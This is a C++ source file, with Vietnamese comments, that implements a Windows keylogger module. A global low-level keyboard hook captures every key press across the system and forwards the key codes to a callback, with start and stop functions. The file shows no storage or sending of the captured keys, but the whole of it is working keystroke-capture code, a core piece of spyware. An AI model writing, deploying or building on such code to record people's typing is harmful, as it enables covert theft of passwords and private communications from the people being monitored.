#include "keylogging.h"

#ifdef _WIN32
#include <windows.h>
#include <winuser.h>
#pragma comment(lib, "user32.lib")
#endif

static KeyEventCallback g_callback = nullptr;
static std::atomic<bool> g_isKeylogging(false);
static HHOOK g_keyboardHook = nullptr;
static std::thread g_loggerThread;
static DWORD g_loggerThreadId = 0;

void logKey(int key)
{
    if (g_callback)
        g_callback(key);
}

// Hàm hook callback của Windows
LRESULT CALLBACK keyboardProc(int code, WPARAM wParam, LPARAM lParam)
{
    if (code == HC_ACTION &&
        (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
    {
        const auto *kb = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);
        logKey(kb->vkCode);
    }
    return CallNextHookEx(g_keyboardHook, code, wParam, lParam);
}

// ===== LUỒNG HOOK =====
void hookThreadFunc()
{
    g_loggerThreadId = GetCurrentThreadId();

    HINSTANCE hInst = GetModuleHandle(nullptr);
    g_keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardProc, hInst, 0);

    if (!g_keyboardHook)
    {
        g_isKeylogging = false;
        return;
    }

    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0) > 0)
    {
        if (msg.message == WM_QUIT)
            break;
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(g_keyboardHook);
    g_keyboardHook = nullptr;
    g_loggerThreadId = 0;
}

// API Public
void setKeyEventCallback(KeyEventCallback cb)
{
    g_callback = cb;
}

// ===== START / STOP =====
void startKeylogger()
{
    if (g_isKeylogging.load())
        return;

    g_isKeylogging.store(true);

    g_loggerThread = std::thread(hookThreadFunc);
}

void stopKeylogger()
{
    if (!g_isKeylogging.load())
        return;

    g_isKeylogging.store(false);

    if (g_keyboardHook && g_loggerThreadId != 0)
        PostThreadMessage(g_loggerThreadId, WM_QUIT, 0, 0);

    if (g_loggerThread.joinable())
        g_loggerThread.join();
}

bool isKeyloggerRunning()
{
    return g_isKeylogging.load();
}